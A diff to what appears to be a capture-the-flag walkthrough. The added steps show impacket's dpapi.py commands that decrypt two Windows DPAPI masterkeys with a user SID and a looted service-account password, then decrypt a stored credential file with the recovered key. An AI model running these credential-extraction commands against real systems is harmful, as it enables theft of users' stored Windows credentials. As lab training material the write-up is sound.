@@ -164,4 +164,14 @@
 
 <img width="913" height="206" alt="image" src="https://github.com/user-attachments/assets/113b47d8-7566-4989-ab20-a7c210e35fee" />
 
-25. Decode the base64 files
+25. After decoding the base64 files, we proceed to decrypt the DPAPI files. We will first decrypt the 2 masterkeys and then try both to see which one decrypts the credential file. So first, using dpapi.py, we decode the 2 DPAPI masterkeys
+
+`dpapi.py masterkey -file dpapi1.key -sid $(cat c.neri.sid) -password $(cat ../user/svc_sql.pass)`
+
+`dpapi.py masterkey -file dpapi2.key -sid $(cat c.neri.sid) -password $(cat ../user/svc_sql.pass)`
+
+26. Now with the 2 masterkeys, we try decrypting the credential file using dpapi.py again
+
+`dpapi.py credential -file credentials.txt -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a`
+
+27. 
